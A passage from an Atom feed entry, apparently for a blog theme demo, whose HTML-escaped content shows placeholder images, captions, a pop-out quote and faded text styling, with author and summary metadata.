+&lt;p&gt;&lt;img src=&quot;https://placehold.it/800x100&quot; alt=&quot;Full-width image&quot; class=&quot;lead&quot; data-width=&quot;800&quot; data-height=&quot;100&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;captions-to-images&quot;&gt;Captions to images&lt;/h2&gt;
+&lt;p class=&quot;figure&quot;&gt;&lt;img src=&quot;https://placehold.it/800x100&quot; alt=&quot;Full-width image&quot; class=&quot;lead&quot; data-width=&quot;800&quot; data-height=&quot;100&quot; /&gt;
+A caption to an image.&lt;/p&gt;
+
+&lt;h2 id=&quot;large-quotes&quot;&gt;Large quotes&lt;/h2&gt;
+&lt;blockquote class=&quot;lead&quot;&gt;
+  &lt;p&gt;You can make a quote “pop out”.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;faded-text&quot;&gt;Faded text&lt;/h2&gt;
+&lt;p class=&quot;faded&quot;&gt;I’m faded, faded, faded.&lt;/p&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">Message boxes NOTE: You can add a message box.</summary></entry></feed>
